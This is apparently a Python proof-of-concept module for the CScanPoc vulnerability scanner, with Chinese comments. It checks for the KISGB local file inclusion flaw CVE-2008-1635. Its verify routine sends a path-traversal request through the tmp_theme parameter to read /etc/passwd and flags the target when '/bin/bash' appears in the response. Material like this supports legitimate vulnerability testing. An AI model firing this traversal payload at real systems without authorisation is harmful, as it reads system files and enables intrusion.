# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    poc_id = 'a589428c-ab6d-47ad-9be1-f899234e96c6'
    name = 'KISGB Local File Inclusion' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2008-04-02'  # 漏洞公布时间
    desc = '''
        KISGB view_private.php文件在处理传入的参数时存在缺陷，导致产生本地文件包含漏洞。
    ''' # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-65284' # 
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'CVE-2008-1635'  # cve编号
    product = 'KISGB'  # 漏洞组件名称
    product_version = '<= (tmp_theme) 5.1.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '73eb811c-e5bd-48ba-875a-66f03067ab3d' # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vul_url = '%s/view_private.php?start=1&action=edit&tmp_theme=../../../../../../etc/passwd' % arg
            response = requests.get(vul_url, timeout=10).content

            if '/bin/bash' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()